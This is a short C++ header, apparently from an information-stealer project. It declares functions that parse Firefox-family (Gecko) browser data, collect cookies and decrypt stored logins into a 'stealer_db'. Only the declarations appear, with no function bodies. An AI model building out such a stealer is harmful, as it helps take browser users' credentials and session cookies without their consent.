#ifndef GECKOPARSER_H
#define GECKOPARSER_H

#include "DataHolder.h"
#include "DataDump.h"
#include "GeckoDecryptor.h"

using namespace std::filesystem;
using json = nlohmann::json;

BOOL gecko_parser(std::string username, std::string stealer_db);
BOOL gecko_cookie_collector(std::string username, std::string stealer_db);
std::string get_gecko_program_dir(std::string target_user_data);
sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);

#endif /* GECKOPARSER_H */